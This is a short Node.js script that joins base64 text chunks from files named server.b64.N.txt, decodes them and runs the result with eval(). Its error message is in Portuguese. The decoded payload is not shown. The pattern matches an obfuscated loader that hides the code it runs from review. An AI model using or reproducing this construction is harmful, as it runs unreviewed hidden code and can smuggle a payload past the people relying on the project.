const fs=require('fs');
const path=require('path');
const dir=__dirname;
let parts=[];
for(let i=1;i<=20;i++){
  const f=path.join(dir,`server.b64.${i}.txt`);
  if(!fs.existsSync(f)) break;
  parts.push(fs.readFileSync(f,'utf8').trim());
}
if(!parts.length) throw new Error('Arquivos bridge/server.b64.*.txt não encontrados');
eval(Buffer.from(parts.join(''),'base64').toString('utf8'));
